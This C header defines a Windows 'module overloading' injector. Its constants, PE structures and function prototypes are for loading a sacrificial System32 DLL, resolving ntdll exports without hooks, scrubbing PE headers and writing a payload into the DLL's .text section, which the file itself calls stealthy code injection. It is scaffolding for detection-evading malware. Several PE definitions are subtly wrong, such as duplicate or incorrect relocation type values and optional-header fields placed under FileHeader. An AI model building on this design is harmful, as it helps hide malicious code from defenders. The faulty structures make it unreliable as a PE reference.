/*
 * Module Overloading - Header Definitions
 *
 * Structures and interfaces for stealthy code injection via
 * sacrificial DLL loading with manual mapping and header scrubbing.
 *
 * Target: Windows 10/11 x64
 * Environment: No-CRT
 */

#ifndef _MODULE_OVERLOADING_H
#define _MODULE_OVERLOADING_H

//------------------------------------------------------------------------------
// Module Overloading Constants
//------------------------------------------------------------------------------

#define MODULE_OVERLOADING_TAG                0x444C4C44  // "DLLD"
#define MODULE_OVERLOADING_MAX_SECTIONS       32
#define MODULE_OVERLOADING_MAX_IMPORTS        256
#define MODULE_OVERLOADING_EXPORT_DIR_ENTRY_SIZE  sizeof(ULONG) * 3

// Sacrificial DLL candidates in System32
#define SACRIFICIAL_DLL_DEFAULT               L"System32\\wtsapi32.dll"
#define SACRIFICIAL_DLL_FALLBACK              L"System32\\profapi.dll"
#define SACRIFICIAL_DLL_MIN_SIZE              (512 * 1024)  // 512 KB minimum

// Memory allocation flags for VAD tree integration
#define MEM_IMAGE_ALLOC_FLAGS                 (MEM_COMMIT | MEM_RESERVE)
#define MEM_IMAGE_PROTECT_FLAGS               (PAGE_EXECUTE_READWRITE)
#define MEM_IMAGE_PROTECT_FINAL               (PAGE_EXECUTE_READ)

// Header scrubbing mask
#define HEADER_SCRUB_ZERO_VALUE               0x00
#define HEADER_SCRUB_DOS_SIGNATURE_OFFSET     0x3C

//------------------------------------------------------------------------------
// Module Overloading Types
//------------------------------------------------------------------------------

typedef enum _MODULE_OVERLOADING_STATE {
    ModuleOverloadingIdle,
    ModuleOverloadingDllSelected,
    ModuleOverloadingDllLoaded,
    ModuleOverloadingRelocationApplied,
    ModuleOverloadingImportsResolved,
    ModuleOverloadingHeadersScrubbed,
    ModuleOverloadingPayloadInjected,
    ModuleOverloadingError
} MODULE_OVERLOADING_STATE, *PMODULE_OVERLOADING_STATE;

typedef enum _RELOCATION_TYPE {
    RelocationTypeNone = 0,
    RelocationTypeDir64 = 0,
    RelocationTypeHigh = 1,
    RelocationTypeLow = 2,
    RelocationTypeDir64High = 3,
    RelocationTypeDir64Low = 4,
    RelocationTypeHighAdjDir64 = 9,
    RelocationTypeRelDir64 = 10
} RELOCATION_TYPE, *PRELOCATION_TYPE;

//------------------------------------------------------------------------------
// PE Format Structures (Minimal for Manual Mapping)
//------------------------------------------------------------------------------

typedef struct _DOS_HEADER {
    USHORT e_magic;
    USHORT e_cblp;
    USHORT e_cp;
    USHORT e_crlc;
    USHORT e_cparh;
    USHORT e_minalloc;
    USHORT e_maxalloc;
    USHORT e_ss;
    USHORT e_sp;
    USHORT e_csum;
    USHORT e_ip;
    USHORT e_cs;
    USHORT e_lfarlc;
    USHORT e_ovno;
    USHORT e_res[4];
    USHORT e_oemid;
    USHORT e_oeminfo;
    USHORT e_res2[10];
    ULONG  e_lfanew;
} DOS_HEADER, *PDOS_HEADER;

typedef struct _NT_HEADERS {
    ULONG Signature;
    struct {
        USHORT Magic;
        UCHAR  MajorLinkerVersion;
        UCHAR  MinorLinkerVersion;
        ULONG  SizeOfCode;
        ULONG  SizeOfInitializedData;
        ULONG  SizeOfUninitializedData;
        ULONG  AddressOfEntryPoint;
        ULONG  BaseOfCode;
        ULONG  BaseOfData;
    } FileHeader;
    struct {
        ULONG Magic;
        UCHAR MajorImageVersion;
        UCHAR MinorImageVersion;
        UCHAR MajorSubsystemVersion;
        UCHAR MinorSubsystemVersion;
        ULONG Win32VersionValue;
        ULONG SizeOfImage;
        ULONG SizeOfHeaders;
        ULONG CheckSum;
        USHORT Subsystem;
        USHORT DllCharacteristics;
        ULONG SizeOfStackReserve;
        ULONG SizeOfStackCommit;
        ULONG SizeOfHeapReserve;
        ULONG SizeOfHeapCommit;
        ULONG LoaderFlags;
        ULONG NumberOfRvaAndSizes;
    } OptionalHeader;
} NT_HEADERS, *PNT_HEADERS;

typedef struct _SECTION_HEADER {
    UCHAR Name[8];
    ULONG VirtualSize;
    ULONG VirtualAddress;
    ULONG SizeOfRawData;
    ULONG PointerToRawData;
    ULONG PointerToRelocations;
    ULONG PointerToLinenumbers;
    USHORT NumberOfRelocations;
    USHORT NumberOfLinenumbers;
    ULONG Characteristics;
} SECTION_HEADER, *PSECTION_HEADER;

typedef struct _RELOCATION_BLOCK {
    ULONG VirtualAddress;
    ULONG SizeOfBlock;
    USHORT Offsets[1];
} RELOCATION_BLOCK, *PRELOCATION_BLOCK;

typedef struct _EXPORT_DIRECTORY {
    ULONG Characteristics;
    ULONG TimeDateStamp;
    USHORT MajorVersion;
    USHORT MinorVersion;
    ULONG Name;
    ULONG Base;
    ULONG NumberOfNames;
    ULONG NumberOfFunctions;
    ULONG AddressOfFunctions;
    ULONG AddressOfNames;
    ULONG AddressOfNameOrdinals;
} EXPORT_DIRECTORY, *PEXPORT_DIRECTORY;

//------------------------------------------------------------------------------
// Module Overloading Context
//------------------------------------------------------------------------------

typedef struct _MODULE_OVERLOADING_CONTEXT {
    // Identification
    ULONG Tag;
    MODULE_OVERLOADING_STATE State;

    // Sacrificial DLL information
    UNICODE_STRING SacrificialDllPath;
    HANDLE DllHandle;
    PVOID DllBaseAddress;
    SIZE_T DllSize;

    // PE Headers (cached for scrubbing)
    PDOS_HEADER DosHeader;
    PNT_HEADERS NtHeaders;
    PSECTION_HEADER SectionHeaders;
    USHORT NumberOfSections;

    // Relocation information
    PVOID RelocationDirectory;
    ULONG RelocationTableRva;
    ULONG RelocationTableSize;
    ULONGLONG DllImageBase;

    // Import resolution
    PEXPORT_DIRECTORY NtdllExportDirectory;
    PVOID NtdllBaseAddress;
    ULONG ResolvedFunctions[256];
    ULONG ResolvedFunctionCount;

    // Payload injection
    PVOID PayloadBuffer;
    SIZE_T PayloadSize;
    PVOID TextSectionBase;
    SIZE_T TextSectionSize;

    // Header scrubbing
    BOOLEAN HeadersScrubbed;
    SIZE_T ScrubbedHeaderSize;

    // Operation statistics
    ULONG RelocationsApplied;
    ULONG ImportsResolved;
    ULONG TotalOperations;
    NTSTATUS LastError;

    // Timing
    ULONGLONG LoadTime;
    ULONGLONG InjectionTime;

} MODULE_OVERLOADING_CONTEXT, *PMODULE_OVERLOADING_CONTEXT;

//------------------------------------------------------------------------------
// Function Prototypes - Sacrificial DLL Loading
//------------------------------------------------------------------------------

NTSTATUS InitializeModuleOverloading(
    OUT PMODULE_OVERLOADING_CONTEXT Context
);

NTSTATUS SelectSacrificialDll(
    OUT PMODULE_OVERLOADING_CONTEXT Context,
    IN PUNICODE_STRING DllPath,
    OUT PSIZE_T DllSize
);

NTSTATUS LoadSacrificialDll(
    IN PMODULE_OVERLOADING_CONTEXT Context,
    IN PUNICODE_STRING DllPath
);

BOOLEAN ValidateMemImageEntry(
    IN PMODULE_OVERLOADING_CONTEXT Context
);

//------------------------------------------------------------------------------
// Function Prototypes - Base Relocation
//------------------------------------------------------------------------------

NTSTATUS ParseBaseRelocationTable(
    IN PMODULE_OVERLOADING_CONTEXT Context,
    OUT PULONG RelocationCount
);

NTSTATUS ApplyBaseRelocations(
    IN PMODULE_OVERLOADING_CONTEXT Context,
    IN ULONGLONG Delta
);

BOOLEAN ValidateRelocationBlock(
    IN PRELOCATION_BLOCK Block,
    IN ULONG BlockSize
);

//------------------------------------------------------------------------------
// Function Prototypes - Hookless IAT Resolver
//------------------------------------------------------------------------------

NTSTATUS InitializeNtdllExportDirectory(
    IN PMODULE_OVERLOADING_CONTEXT Context
);

PVOID ResolveExportByName(
    IN PMODULE_OVERLOADING_CONTEXT Context,
    IN PCHAR FunctionName
);

PVOID ResolveExportByOrdinal(
    IN PMODULE_OVERLOADING_CONTEXT Context,
    IN ULONG FunctionOrdinal
);

BOOLEAN WalkExportDirectory(
    IN PEXPORT_DIRECTORY ExportDir,
    IN PCHAR TargetName,
    OUT PULONG FunctionRva
);

//------------------------------------------------------------------------------
// Function Prototypes - Header Scrubbing
//------------------------------------------------------------------------------

NTSTATUS ScrubDosHeader(
    IN PMODULE_OVERLOADING_CONTEXT Context
);

NTSTATUS ScrubNtHeaders(
    IN PMODULE_OVERLOADING_CONTEXT Context
);

NTSTATUS ScrubSectionHeaders(
    IN PMODULE_OVERLOADING_CONTEXT Context
);

NTSTATUS PerformHeaderScrubbing(
    IN PMODULE_OVERLOADING_CONTEXT Context
);

BOOLEAN VerifyHeaderScrubbing(
    IN PMODULE_OVERLOADING_CONTEXT Context
);

//------------------------------------------------------------------------------
// Function Prototypes - Payload Injection
//------------------------------------------------------------------------------

NTSTATUS InjectPayloadToTextSection(
    IN PMODULE_OVERLOADING_CONTEXT Context,
    IN PVOID Payload,
    IN SIZE_T PayloadSize
);

VOID CleanupModuleOverloading(
    IN PMODULE_OVERLOADING_CONTEXT Context
);

#endif // _MODULE_OVERLOADING_H
